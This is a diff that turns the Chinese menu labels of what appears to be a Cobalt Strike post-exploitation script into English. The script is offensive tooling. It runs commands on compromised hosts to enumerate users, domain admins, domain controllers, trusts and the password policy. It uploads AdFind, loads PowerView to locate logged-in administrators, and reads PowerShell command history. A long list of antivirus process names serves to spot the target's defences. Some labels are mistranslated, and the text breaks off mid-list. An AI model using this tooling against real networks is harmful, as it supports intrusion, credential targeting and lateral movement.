@@ -1,6 +1,6 @@
-menu "☆ 信息收集" {
+menu "Information Gathering" {
 		
-	menu "工作组常用命令" {
+	menu "Common Workgroup Commands" {
 		item "systeminfo" {
 			blog($1, "\c9=========== systeminfo ==========");
 			$bid = $1['@'];
@@ -16,396 +16,396 @@ menu "☆ 信息收集" {
 			$bid = $1['@'];
 			bshell($bid, "ipconfig /all");
 		}
-		menu "查看网络信息"	{
-			item "查看路由表" {
-				blog($1, "\c9=========== 查看路由表 ==========");
+		menu "Check network information"	{
+			item "View the routing table" {
+				blog($1, "\c9=========== View routing table ==========");
 				$bid = $1['@'];
 				bshell($bid, "route print");
 			}
-			item "查看 ARP 缓存" {
-				blog($1, "\c9=========== 查看 ARP 缓存 ==========");
+			item "View ARP Cache" {
+				blog($1, "\c9=========== View ARP Cache ==========");
 				$bid = $1['@'];
 				bshell($bid, "arp -A");
 			}
-			item "查看 Hosts 文件" {
-				blog($1, "\c9=========== 查看 Hosts 文件 ==========");
+			item "View Hosts File" {
+				blog($1, "\c9=========== View Hosts File ==========");
 				bshell($1, "type C:\\Windows\\System32\\drivers\\etc\\hosts");
 			}
-			item "查看 DNS 缓存" {
-				blog($1, "\c9=========== 查看 DNS 缓存 ==========");
+			item "View DNS Cache" {
+				blog($1, "\c9=========== View DNS Cache ==========");
 				bshell($1, "ipconfig /displaydns");
 			}
-			item "Tracert 路由跟踪" {
-				blog($1, "\c9=========== Tracert 路由跟踪 ==========");
-				prompt_text("需要跟踪的ip或域名：", "", lambda({ bshell(@ids, "tracert $1");  }, @ids => $1));
+			item "Tracert Routing Tracking" {
+				blog($1, "\c9=========== Tracert Routing Tracking ==========");
+				prompt_text("The ip or domain to be traced：", "", lambda({ bshell(@ids, "tracert $1");  }, @ids => $1));
 			}		
 		}	
-		item "查看用户信息" {
-			blog($1, "\c9=========== 查看用户信息 ==========");
+		item "View User Information" {
+			blog($1, "\c9=========== View User Information ==========");
 			$bid = $1['@'];
 			bshell($bid, "net user");
 		}		
-		item "查看安装程序和版本信息" {
-			blog($1, "\c9=========== 查看安装程序和版本信息 ==========");
+		item "View Installer and version information" {
+			blog($1, "\c9=========== View Installer and version information ==========");
 			$bid = $1['@'];
 			bshell($bid, "wmic product get name,version");
 		}
-		item "查看安装的补丁" {
-			blog($1, "\c9=========== 查看安装的补丁 ==========");
+		item "View Installed patches" {
+			blog($1, "\c9=========== View Installed patches ==========");
 			$bid = $1['@'];
 			bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
 		}
-		item "查看运行的进程及路径" {
-			blog($1, "\c9=========== 查看运行的进程及路径 ==========");
+		item "View Running processes and paths" {
+			blog($1, "\c9=========== View Running processes and paths ==========");
 			$bid = $1['@'];
 			bshell($bid, "wmic process get caption,executablepath,commandline");
 		}
-		item "查看进程详细信息" {
-			blog($1, "\c9=========== 查看进程详细信息 ==========");
+		item " View process details" {
+			blog($1, "\c9===========  View process details ==========");
 			$bid = $1['@'];
 			bshell($bid, "wmic process get caption,commandline,processid /value");
 		}
-		item "查看服务" {
-			blog($1, "\c9=========== 查看服务 ==========");
+		item " View Services" {
+			blog($1, "\c9===========  View Services ==========");
 			$bid = $1['@'];
 			bshell($bid, "wmic service list brief");
 		}
-		item "查看防火墙配置" {
-			blog($1, "\c9=========== 查看防火墙配置 ==========");
+		item " View Firewall Configuration" {
+			blog($1, "\c9===========  View Firewall Configuration ==========");
 			$bid = $1['@'];
 			bshell($bid, "netsh firewall show config");
 		}
-		item "查看计划任务" {
-			blog($1, "\c9=========== 查看计划任务 ==========");
+		item " View scheduled tasks" {
+			blog($1, "\c9===========  View scheduled tasks ==========");
 			$bid = $1['@'];
 			bshell($bid, "schtasks.exe");
 		}
-		item "查看计划任务详情" {
-			blog($1, "\c9=========== 查看计划任务详情 ==========");
+		item " View scheduled tasks details" {
+			blog($1, "\c9===========  View scheduled tasks details ==========");
 			$bid = $1['@'];
 			bshell($bid, "schtasks /query /fo LIST /v");
 		}
-		item "查看启动程序信息" {
-			blog($1, "\c9=========== 查看启动程序信息 ==========");
+		item " View startup program information" {
+			blog($1, "\c9===========  View startup program information ==========");
 			$bid = $1['@'];
 			bshell($bid, "wmic startup get command,caption");
 		}
-		item "查看在线用户" {
-			blog($1, "\c9=========== 查看在线用户 ==========");
+		item " View Online Users" {
+			blog($1, "\c9===========  View Online Users ==========");
 			$bid = $1['@'];
 			bshell($bid, "query user || qwinsta");
 		}
-		item "查看开机时间" {
-			blog($1, "\c9=========== 查看开机时间 ==========");
+		item " View Power On Time" {
+			blog($1, "\c9===========  View Power On Time ==========");
 			$bid = $1['@'];
 			bshell($bid, "net statistics workstation");
 		}
-		item "查看powershell v5历史命令" {
-			blog($1, "\c9=========== 查看powershell v5历史命令 ==========");
+		item "Viewpowershell v5 History Command" {
+			blog($1, "\c9=========== Viewpowershell v5 History Command ==========");
 			$bid = $1['@'];
 			bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
 		}
-		item "查看最近使用的项目" {
-			blog($1, "\c9=========== 查看最近使用的项目 ==========");
+		item "View recently used items" {
+			blog($1, "\c9=========== View recently used items ==========");
 			$bid = $1['@'];
 			bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
 		}
-		item "查看SMB指向路径" {
-			blog($1, "\c9=========== 查看SMB指向路径 ==========");
+		item "ViewSMB pointing path" {
+			blog($1, "\c9=========== ViewSMB pointing path ==========");
 			$bid = $1['@'];
 			bshell($bid, "wmic share get name,path");
 		}
 	}
 
-	menu "域环境常用命令" {
-		menu "AdFind (查询域内信息)" {
-			item "上传AdFind" {
-				blog($1, "\c9=========== 上传AdFind ==========");
+	menu "AD Enumeration" {
+		menu "AdFind (Querying information in the domain)" {
+			item "Upload AdFind" {
+				blog($1, "\c9=========== Upload AdFind ==========");
 				$bid = $1;
-				$dialog = dialog("上传AdFind", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &AdFind_upload);
-				dialog_description($dialog,"AdFind用于查询域内信息。项目地址：http://www.joeware.net/freetools/tools/adfind/index.htm");
-				drow_text($dialog, "UploadPath",  "上传路径: ");
-				dbutton_action($dialog, "上传");
+				$dialog = dialog("Upload AdFind", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &AdFind_upload);
+				dialog_description($dialog,"AdFind is used to query information in the domain. Project Address：http://www.joeware.net/freetools/tools/adfind/index.htm");
+				drow_text($dialog, "UploadPath",  "Upload Paths: ");
+				dbutton_action($dialog, "Upload ");
 				dialog_show($dialog);
 			}
 			sub AdFind_upload {
 				bcd($bid, $3['UploadPath']);
 				bupload($bid, script_resource("/scripts/InfoCollect/AdFind.exe"));
 			}
-			item "列出域控制器名称" {
-				blog($1, "\c9=========== 列出域控制器名称 ==========");
+			item "List domain controller names" {
+				blog($1, "\c9=========== List domain controller names ==========");
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -sc dclist");
 			}
-			item "查询当前域中在线的计算机" {
-				blog($1, "\c9=========== 查询当前域中在线的计算机 ==========");
+			item "Query online computers in domain" {
+				blog($1, "\c9=========== Query online computers in domain ==========");
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -sc computers_active");
 			}
-			item "查询当前域中在线的计算机(只显示名称和操作系统)" {
-				blog($1, "\c9=========== 查询当前域中在线的计算机(只显示名称和操作系统) ==========");
+			item "Query online computers in domain(Displays name and operating system)" {
+				blog($1, "\c9=========== Query online computers in domain(Displays name and operating system) ==========");
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -sc computers_active name operatingSystem");
 			}
-			item "查询当前域中所有计算机" {
-				blog($1, "\c9=========== 查询当前域中所有计算机 ==========");
+			item "Query all computers in the current domain" {
+				blog($1, "\c9=========== Query all computers in the current domain ==========");
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -f \"objectcategory=computer\"");
 			}
-			item "查询当前域中所有计算机(只显示名称和操作系统)" {
-				blog($1, "\c9=========== 查询当前域中所有计算机(只显示名称和操作系统) ==========");
+			item "Query all computers in the current domain(Display only the name and operating system)" {
+				blog($1, "\c9=========== Query all computers in the current domain(Display only the name and operating system) ==========");
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -f \"objectcategory=computer\" name operatingSystem");
 			}
-			item "查询域内所有用户" {
-				blog($1, "\c9=========== 查询域内所有用户 ==========");
+			item "Query all users in the domain" {
+				blog($1, "\c9=========== Query all users in the domain ==========");
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -users name");
 			}
-			item "查询所有GPO" {
-				blog($1, "\c9=========== 查询所有GPO ==========");
+			item "Query all GPOs" {
+				blog($1, "\c9=========== Query all GPOs ==========");
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -sc gpodmp");
 			}
-			item "删除AdFind" {
-				blog($1, "\c9=========== 删除AdFind ==========");
+			item "Delete AdFind" {
+				blog($1, "\c9=========== Delete AdFind ==========");
 				$bid = $1['@'];
 				bshell($bid, "del /f /s /q AdFind.exe");
 			}
 		}
-		item "查看域信息"{
-			blog($1, "\c9=========== 查看域信息 ==========");
+		item "View Domain Information"{
+			blog($1, "\c9=========== View Domain Information ==========");
 			bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
 			bpowerpick($1, "Get-NetForest");
 		}
-		menu "查找域控制器"{
-			item "查看主域控制器" {
-				blog($1, "\c9=========== 查看主域控制器 ==========");
+		menu "Find a Domain Controller"{
+			item "View Primary Domain Controller" {
+				blog($1, "\c9=========== View Primary Domain Controller ==========");
 				$bid = $1['@'];
 				bshell($bid, "netdom query pdc");
 			}
-			item "查看域控列表" {
-				blog($1, "\c9=========== 查看域控列表 ==========");
+			item "View Domain Controller List" {
+				blog($1, "\c9=========== View Domain Controller List ==========");
 				$bid = $1['@'];
 				bshell($bid, "net group \"Domain Controllers\" /domain");
 			}		
-			item "获取域控详细信息" {
-				blog($1, "\c9=========== 获取域控详细信息 ==========");
+			item "Get domain controller details" {
+				blog($1, "\c9=========== Get domain controller details ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
 				bpowerpick($1, "Get-NetDomainController");
 			}
-			item "Net time 查找域控" {
-				blog($1, "\c9=========== Net time 查找域控 ==========");
+			item "Net time Find a Domain" {
+				blog($1, "\c9=========== Net time Find a Domain ==========");
 				bshell($1, "net time /domain");
 			}
-			item "Nslookup 查找域控" {
-				blog($1, "\c9=========== Nslookup 查找域控 ==========");
-				prompt_text("输入域名：", "xstark.sec", lambda({ bshell(@ids, "Nslookup -type=SRV _ldap._tcp $1"); }, @ids => $1));
+			item "Nslookup Find a Domain Controller" {
+				blog($1, "\c9=========== Nslookup Find a Domain Controller ==========");
+				prompt_text("Enter the domain name:", "xstark.sec", lambda({ bshell(@ids, "Nslookup -type=SRV _ldap._tcp $1"); }, @ids => $1));
 			}
-			item "Nltest 查找域控" {
-				blog($1, "\c9=========== Nltest 查找域控 ==========");
-				prompt_text("输入域名：", "xstark.sec", lambda({ bshell(@ids, "nltest /DCLIST:$1"); }, @ids => $1));
+			item "Nltest Find a Domain Controller" {
+				blog($1, "\c9=========== Nltest Find a Domain Controller ==========");
+				prompt_text("Enter the domain name:", "xstark.sec", lambda({ bshell(@ids, "nltest /DCLIST:$1"); }, @ids => $1));
 			}
 		}
 
-		menu "查询域管理员" {
-			item "查找域管理员" {
-				blog($1, "\c9=========== 查找域管理员 ==========");
+		menu "Query Domain Administrator" {
+			item "Find Domain Admins" {
+				blog($1, "\c9=========== Find Domain Admins ==========");
 				$bid = $1['@'];
 				bshell($bid, 'net group "domain admins" /domain');
 			}
-			item "查找企业管理员" {
-				blog($1, "\c9=========== 查找企业管理员 ==========");
+			item "Find Enterprise Administrators" {
+				blog($1, "\c9=========== Find Enterprise Administrators ==========");
 				$bid = $1['@'];
 				bshell($bid, 'net group "enterprise admins" /domain');
 			}
-			item "查看登录本机的域管" {
-				blog($1, "\c9=========== 查看登录本机的域管 ==========");
+			item "View localgroup Admins" {
+				blog($1, "\c9=========== View localgroup Admins ==========");
 				$bid = $1['@'];
 				bshell($bid, "net localgroup administrators /domain");
 			}
 		}
 
-		menu "查询域内用户" {
-			item "查询指定域用户信息" {
-				blog($1, "\c9=========== 查询指定域用户信息 ==========");
-				prompt_text("输入域用户名", "", lambda({bshell(@bid, "net user $1 /domain");}, @bid => $bid));
+		menu "Querying users in the domain" {
+			item "Query the user information of the specified domain" {
+				blog($1, "\c9=========== Query the user information of the specified domain ==========");
+				prompt_text("Enter the domain user name", "", lambda({bshell(@bid, "net user $1 /domain");}, @bid => $bid));
 			}
-			item "查询当前域用户 SID" {
-				blog($1, "\c9=========== 查询域用户 SID ==========");
+			item "Query current domain users SID" {
+				blog($1, "\c9=========== Query Domain Userss SID ==========");
 				$bid = $1['@'];
 				bshell($bid, "whoami /user");
 			}
-			item "查看所有域用户" {
-				blog($1, "\c9=========== 查看所有域用户 ==========");
+			item "View All domain users" {
+				blog($1, "\c9=========== View All domain users ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/PowerView.ps1"));
 				bpowerpick($1, "Get-NetUser | select name");
 			}
-			item "查看域内所有用户组列表" {
-				blog($1, "\c9=========== 查看域内所有用户组列表 ==========");
+			item "View all user groups in the domain" {
+				blog($1, "\c9=========== View all user groups in the domain ==========");
 				$bid = $1['@'];
 				bshell($bid, "net group /domain");
 			}
-			item "统计域内用户数量" {
-				blog($1, "\c9=========== 统计域内用户数量 ==========");
+			item "Count the number of users in the domain" {
+				blog($1, "\c9=========== Count the number of users in the domain ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/PowerView.ps1"));
 				bpowerpick($1, "Get-NetUser | select name | measure | findstr Count");
 			}
-			item "将域用户导出到文件" {
-				blog($1, "\c9=========== 将域用户导出到文件 ==========");
+			item "Exporting domain users to File" {
+				blog($1, "\c9=========== Exporting domain users to File ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/PowerView.ps1"));
 				bpowerpick($1, "Get-NetUser | select name > domain_user.txt");
-				blog($1, "将域内用户详细信息导出到当前目录下的 domain_user.txt 文件中!");
+				blog($1, "Export the user details in the domain to the current directory of domain_user.txt File!");
 			}
-			item "将域用户详细信息导出到文件" {
-				blog($1, "\c9=========== 将域用户详细信息导出到文件 ==========");
+			item "Export domain user details to File" {
+				blog($1, "\c9=========== Export domain user details to File ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/PowerView.ps1"));
 				bpowerpick($1, "Get-NetUser > domain_user_info.txt");
-				blog($1, "将域内用户导出到当前目录下的 domain_user_info.txt 文件中!");
+				blog($1, "Export the users in the domain to the current directory of domain_user_info.txt File!");
 			}
-			item "查询指定域用户在哪些域组中" {
-				blog($1, "\c9=========== 查询指定域用户在哪些域组中 ==========");
+			item "Query which domain groups the specified domain users are in" {
+				blog($1, "\c9=========== Query which domain groups the specified domain users are in ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/PowerView.ps1"));
-				prompt_text("输入要查询的域用户：", "", lambda({ bpowerpick(@ids, "Get-NetGroup -UserName $1"); }, @ids => $1));
+				prompt_text("Enter the domain user to query:", "", lambda({ bpowerpick(@ids, "Get-NetGroup -UserName $1"); }, @ids => $1));
 			}				
 		}
-		menu "查询域内主机"{
-			item "查看所有域成员计算机列表" {
-				blog($1, "\c9=========== 查看所有域成员计算机列表 ==========");
+		menu "Query hosts in the domain"{
+			item "View a list of all domain member computers" {
+				blog($1, "\c9=========== View a list of all domain member computers ==========");
 				$bid = $1['@'];
 				bshell($bid, "net group \"domain computers\" /domain");
 			}
-			item "查看域内所有计算机" {
-				blog($1, "\c9=========== 查看域内所有计算机 ==========");
-				prompt_text("输入主机名", "", lambda({bshell(@bid, "net view /domain:$1");}, @bid => $bid));
+			item "View all computers in the domain" {
+				blog($1, "\c9=========== View all computers in the domain ==========");
+				prompt_text("Enter the host name", "", lambda({bshell(@bid, "net view /domain:$1");}, @bid => $bid));
 			}		
-			item "统计域内主机数量" {
-				blog($1, "\c9=========== 统计域内主机数量 ==========");
+			item "Count the number of hosts in the domain" {
+				blog($1, "\c9=========== Count the number of hosts in the domain ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
 				bpowerpick($1, "Get-NetComputer | measure | findstr Count");
 			}
-			item "查看域内主机" {
-				blog($1, "\c9=========== 查看域内主机 ==========");
+			item "View hosts in the domain" {
+				blog($1, "\c9=========== View hosts in the domain ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
 				bpowerpick($1, "Get-NetComputer");
 			}
-			item "将域主机导出到文件" {
-				blog($1, "\c9=========== 将域主机导出到文件 ==========");
+			item "Exporting domain hosts to File" {
+				blog($1, "\c9=========== Exporting domain hosts to File ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
 				bpowerpick($1, "Get-NetComputer > domain_computer.txt");
-				blog($1, "将域内主机导出到当前目录下的 domain_computer.txt 文件中!");
+				blog($1, "Export the hosts in the domain to the current directory in domain_computer.txt File!");
 			}
-			item "查询带指定字符的主机" {
-				blog($1, "\c9=========== 查询带指定字符的主机 ==========");
+			item "Query the specified host" {
+				blog($1, "\c9=========== Query the specified host ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
-				prompt_text("输入要查询的字符：", "admin", lambda({ bpowerpick(@ids, "Get-NetComputer \*$1\*"); }, @ids => $1));
+				prompt_text("Enter the characters to be queried:", "admin", lambda({ bpowerpick(@ids, "Get-NetComputer \*$1\*"); }, @ids => $1));
 			}
 		}
-		menu "查询域内的组"{
-			item "查询域内的组名(所有组)" {
-				blog($1, "\c9=========== 查询域内的组名(所有组) ==========");
+		menu "Query groups within the domain"{
+			item "Query group name in the domain(All groups)" {
+				blog($1, "\c9=========== Query group name in the domain(All groups) ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
 				bpowerpick($1, "Get-NetGroup");
 			}
-			item "查询域内的组名(全局组、通用组)" {
-				blog($1, "\c9=========== 查询域内的组名(全局组、通用组) ==========");
+			item "Query group name in the domain(Global Groups, General Groups)" {
+				blog($1, "\c9=========== Query groups(Global Groups, General Groups) ==========");
 				bshell($1, "net group /domain");
 			}
-			item "将域组导出到文件" {
-				blog($1, "\c9=========== 将域组导出到文件 ==========");
+			item "Exporting domain groups to File" {
+				blog($1, "\c9=========== Exporting Domain Groups to File ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
 				bpowerpick($1, "Get-NetGroup > domain_group.txt");
-				blog($1, "将域内的组导出到当前目录下的 domain_group.txt 文件中!");
+				blog($1, "Export the groups in the domain to File!");
 			}
-			item "查询带指定字符的域组" {
-				blog($1, "\c9=========== 查询带指定字符的域组 ==========");
+			item "Query a specified domain group" {
+				blog($1, "\c9=========== Query a specified domain group ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
-				prompt_text("输入要查询的字符：", "admin", lambda({ bpowerpick(@ids, "Get-NetGroup \*$1\*"); }, @ids => $1));
+				prompt_text("Enter the characters to be queried:", "admin", lambda({ bpowerpick(@ids, "Get-NetGroup \*$1\*"); }, @ids => $1));
 			}
-			item "查询指定域用户在哪些域组中" {
-				blog($1, "\c9=========== 查询指定域用户在哪些域组中 ==========");
+			item "Query which domain groups the specified domain users are in" {
+				blog($1, "\c9=========== Query which domain groups the specified domain users are in ==========");
 				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
-				prompt_text("输入要查询的域用户：", "", lambda({ bpowerpick(@ids, "Get-NetGroup -UserName $1"); }, @ids => $1));
+				prompt_text("Enter the domain user to query：", "", lambda({ bpowerpick(@ids, "Get-NetGroup -UserName $1"); }, @ids => $1));
 			}
-			item "查询指定组内含有哪些用户" {
-				blog($1, "\c9=========== 查询指定组内含有哪些用户 ==========");
-				prompt_text("输入要查询的组名：", "domain admins", lambda({ bpowerpick(@ids, "net group \"$1\" /domain"); }, @ids => $1));
+			item "Query which users are in the specified group" {
+				blog($1, "\c9=========== Query which users are in the specified group ==========");
+				prompt_text("Enter the name of the group to be queried:", "domain admins", lambda({ bpowerpick(@ids, "net group \"$1\" /domain"); }, @ids => $1));
 			}
 		}				
-		menu "查找域用户或域主机（域管）" {
-			item "查询指定用户当前登录的主机" {
-				blog($1, "\c9=========== 查询指定用户当前登录的主机 ==========");
+		menu "Find a domain user or domain host (domain manager)" {
+			item "Query the currently logged-in host of the specified user" {
+				blog($1, "\c9=========== Query the currently logged-in host of the specified user ==========");
 				bpowershell_import($1, script_resource("/powershell/PowerView.ps1"));
-				prompt_text("输入指定用户：", "administrator", lambda({ bpowerpick(@ids,"Invoke-UserHunter -UserName \"$1\"");}, @ids => $1));
+				prompt_text("Enter the specified user:", "administrator", lambda({ bpowerpick(@ids,"Invoke-UserHunter -UserName \"$1\"");}, @ids => $1));
 			}
-			item "查询指定主机当前登录的用户" {
-				blog($1, "\c9=========== 查询指定主机当前登录的用户 ==========");
+			item "Query the currently logged-in user of the specified host" {
+				blog($1, "\c9=========== Query the currently logged-in user of the specified host ==========");
 				bpowershell_import($1, script_resource("/powershell/PowerView.ps1"));
-				prompt_text("输入指定主机：", "win7", lambda({ bpowerpick(@ids,"Invoke-UserHunter -ComputerName \"$1\"");}, @ids => $1));
+				prompt_text("Enter the specified host:", "win7", lambda({ bpowerpick(@ids,"Invoke-UserHunter -ComputerName \"$1\"");}, @ids => $1));
 			}
 		}
-		menu "DnsQuery 查询（域控）" {
-			item "查询主域控" {
-				blog($1, "\c9=========== 查询主域控 ==========");
+		menu "DnsQuery (Domain Controller)" {
+			item "Querying the main domain controller" {
+				blog($1, "\c9=========== Query Master Domain Controller ==========");
 				bshell($1, "netdom query pdc");
 			}
-			item "查询域控" {
-				blog($1, "\c9=========== 查询域控 ==========");
+			item "Query DC (dsquery)" {
+				blog($1, "\c9=========== Query Domain Controller ==========");
 				bshell($1, "dsquery server");
 			}
-			item "查询域用户" {
-				blog($1, "\c9=========== 查询域用户 ==========");
+			item "Query Domain Users" {
+				blog($1, "\c9=========== Query Domain Users ==========");
 				bshell($1, "dsquery user");
 			}
-			item "查询域主机" {
-				blog($1, "\c9=========== 查询域主机 ==========");
+			item "Query Domain Host" {
+				blog($1, "\c9=========== Query Domain Host ==========");
 				bshell($1, "dsquery computer");
 			}
-			item "查询域组" {
-				blog($1, "\c9=========== 查询域组 ==========");
+			item "Query Domain Group" {
+				blog($1, "\c9=========== Query Domain Group ==========");
 				bshell($1, "dsquery group");
 			}
-			item "查询组织单位" {
-				blog($1, "\c9=========== 查询组织单位 ==========");
+			item "Search for organizational units" {
+				blog($1, "\c9=========== Search for organizational units ==========");
 				bshell($1, "dsquery ou");
 			}
-			item "查询站点" {
-				blog($1, "\c9=========== 查询站点 ==========");
+			item "Search Site" {
+				blog($1, "\c9=========== Search Site ==========");
 				bshell($1, "dsquery site");
 			}
-			item "查询分区" {
-				blog($1, "\c9=========== 查询分区 ==========");
+			item "Query Partition" {
+				blog($1, "\c9=========== Query Partition ==========");
 				bshell($1, "dsquery partition");
 			}
 		}
 
-		item "查看当前登录域" {
-			blog($1, "\c9=========== 查看当前登录域 ==========");
+		item "View Current Login Domain" {
+			blog($1, "\c9=========== View Current Login Domain ==========");
 			$bid = $1['@'];
 			bshell($bid, "net config workstation");
 		}
-		item "查询域内组织单位" {
-			blog($1, "\c9=========== 查询域内的组织单位 ==========");
+		item "Query Domain Organization Unit" {
+			blog($1, "\c9=========== Query Domain's organizational unit ==========");
 			bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
 			bpowerpick($1, "Get-NetOU");
 		}		
-		item "获取域信任关系" {
-			blog($1, "\c9=========== 获取域信任关系 ==========");
+		item "Obtaining Domain Trust Relationships" {
+			blog($1, "\c9=========== Obtaining Domain Trust Relationships ==========");
 			$bid = $1['@'];
 			bshell($bid, "nltest /domain_trusts");
 		}	
-		item "获取域密码策略" {
-			blog($1, "\c9=========== 获取域密码策略 ==========");
+		item "Get Domain Password Policy" {
+			blog($1, "\c9=========== Get Domain Password Policy ==========");
 			$bid = $1['@'];
 			bshell($bid, "net accounts /domain");
 		}
-		item "查询域内 DNS 记录" {
-			blog($1, "\c9=========== 查询域内 DNS 记录 ==========");
+		item "Query Domain DNS Records" {
+			blog($1, "\c9=========== Query Domain DNS Records ==========");
 	        $bid = $1['@'];
-	        $Dialog = dialog("查询域内DNS记录",%(domain => "xstark.sec",bid => $bid),&query_dns);
-	        dialog_description($Dialog, "查询域内的DNS记录");
-	        drow_text($Dialog, "domain", "域名: ");
-	        dbutton_action($Dialog, "确定");
+	        $Dialog = dialog("Query DomainDNSRecords",%(domain => "xstark.sec",bid => $bid),&query_dns);
+	        dialog_description($Dialog, "Query Domain's DNSRecords");
+	        drow_text($Dialog, "domain", "Domain Name: ");
+	        dbutton_action($Dialog, "Identify");
 	        dialog_show($Dialog);
 		}
 		sub query_dns{
@@ -416,124 +416,124 @@ menu "☆ 信息收集" {
 	}
 	
 	separator();
-	menu "主机杀软信息查询" {
-		item "AvSearch（WMIC）" {
-			blog($1, "\c9=========== AvSearch（杀软信息） ==========");
+	menu "Host antivirus information query" {
+		item "AvSearch WMIC" {
+			blog($1, "\c9=========== AvSearch（Antivirus information） ==========");
 			bshell($1,"wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName,productState,pathToSignedProductExe | findstr /V /B /C:displayName || echo No Antivirus installed");
 		}
 
-		item "AntiVirusCheck（状态栏）" {
-			%sr = %(
-				"360tray.exe" => "360安全卫士-实时保护",
-				"360safe.exe": => "360安全卫士-主程序",
-				"ZhuDongFangYu.exe" => "360安全卫士-主动防御",
-				"360sd.exe" => "360杀毒",
-				"a2guard.exe" => "a-squared杀毒",
-				"ad-watch.exe" => "Lavasoft杀毒",
-				"cleaner8.exe" => "The Cleaner杀毒",
-				"vba32lder.exe" => "vb32杀毒",
-				"MongoosaGUI.exe" => "Mongoosa杀毒",
-				"CorantiControlCenter32.exe" => "Coranti2012杀毒",
+						item "AntiVirusCheck(status bar)" {
+				%sr = %(
+				"360tray.exe" => "360 Security Guard - Real-time Protection",
+				"360safe.exe": => "360 Security Guard - Main Program",
+				"ZhuDongFangYu.exe" => "360 Security Guard - Active Defense",
+				"360sd.exe" => "360 antivirus",
+				"a2guard.exe" => "a-squared antivirus",
+				"ad-watch.exe" => "Lavasoft Antivirus",
+				"cleaner8.exe" => "The Cleaner Antivirus",
+				"vba32lder.exe" => "vb32 antivirus",
+				"MongoosaGUI.exe" => "Mongoosa antivirus",
+				"CorantiControlCenter32.exe" => "Coranti2012 antivirus",
 				"F-PROT.exe" => "F-Prot AntiVirus",
-				"CMCTrayIcon.exe" => "CMC杀毒",
-				"K7TSecurity.exe" => "K7杀毒",
-				"UnThreat.exe" => "UnThreat杀毒",
-				"CKSoftShiedAntivirus4.exe" => "Shield Antivirus杀毒",
-				"AVWatchService.exe" => "VIRUSfighter杀毒",
-				"ArcaTasksService.exe" => "ArcaVir杀毒",
-				"iptray.exe" => "Immunet杀毒",
-				"PSafeSysTray.exe" => "PSafe杀毒",
-				"nspupsvc.exe" => "nProtect杀毒",
-				"SpywareTerminatorShield.exe" => "SpywareTerminator反间谍软件",
-				"BKavService.exe" => "Bkav杀毒",
+				"CMCTrayIcon.exe" => "CMC antivirus",
+				"K7TSecurity.exe" => "K7 antivirus",
+				"UnThreat.exe" => "UnThreat antivirus",
+				"CKSoftShiedAntivirus4.exe" => "Shield Antivirus",
+				"AVWatchService.exe" => "VIRUSfighter antivirus",
+				"ArcaTasksService.exe" => "ArcaVir antivirus",
+				"iptray.exe" => "Immunet antivirus",
+				"PSafeSysTray.exe" => "PSafe antivirus",
+				"nspupsvc.exe" => "nProtect antivirus",
+				"SpywareTerminatorShield.exe" => "SpywareTerminator Anti-Spyware",
+				"BKavService.exe" => "Bkav antivirus",
 				"MsMpEng.exe" => "Windows Defender",
 				"SBAMSvc.exe" => "VIPRE",
-				"ccSvcHst.exe" => "Norton杀毒",
-				"f-secure.exe" => "冰岛",
+				"ccSvcHst.exe" => "Norton antivirus",
+				"f-secure.exe" => "Iceland",
 				"avp.exe" => "Kaspersky",
-				"KvMonXP.exe" => "江民杀毒",
-				"RavMonD.exe" => "瑞星杀毒",
+				"KvMonXP.exe" => "Jiangmin Antivirus",
+				"RavMonD.exe" => "Rising Antivirus",
 				"Mcshield.exe" => "McAfee",
 				"Tbmon.exe" => "McAfee",
 				"Frameworkservice.exe" => "McAfee",
 				"egui.exe" => "ESET NOD32",
 				"ekrn.exe" => "ESET NOD32",
 				"eguiProxy.exe" => "ESET NOD32",
-				"kxetray.exe" => "金山毒霸",
-				"knsdtray.exe" => "可牛杀毒",
-				"TMBMSRV.exe" => "趋势杀毒",
-				"avcenter.exe" => "Avira(小红伞)",
-				"avguard.exe" => "Avira(小红伞)",
-				"avgnt.exe" => "Avira(小红伞)",
-				"sched.exe" => "Avira(小红伞)",
-				"ashDisp.exe" => "Avast网络安全",
-				"rtvscan.exe" => "诺顿杀毒",
-				"ccapp.exe" => "SymantecNorton",
-				"NPFMntor.exe" => "Norton杀毒软件",
-				"ccSetMgr.exe" => "赛门铁克",
-				"ccRegVfy.exe" => "Norton杀毒软件",
-				"ksafe.exe" => "金山卫士",
-				"QQPCRTP.exe" => "QQ电脑管家",
-				"avgwdsvc.exe" => "AVG杀毒",
-				"QUHLPSVC.exe" => "QUICK HEAL杀毒",
-				"mssecess.exe" => "微软杀毒",
-				"SavProgress.exe" => "Sophos杀毒",
-				"SophosUI.exe" => "Sophos杀毒",
